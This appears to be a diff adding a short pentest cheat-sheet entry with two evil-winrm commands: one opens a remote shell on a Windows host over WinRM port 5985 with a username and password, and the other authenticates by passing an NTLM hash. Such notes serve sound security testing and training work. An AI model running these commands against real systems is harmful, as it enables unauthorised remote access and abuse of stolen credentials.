@@ -1,0 +1,6 @@
+# start shell on host (port 5985)
+evil-winrm -i <ip> -u <user> -p <password>
+
+# pass the hash
+evil-winrm -u <user> -H <Hash> -i <IP>
+
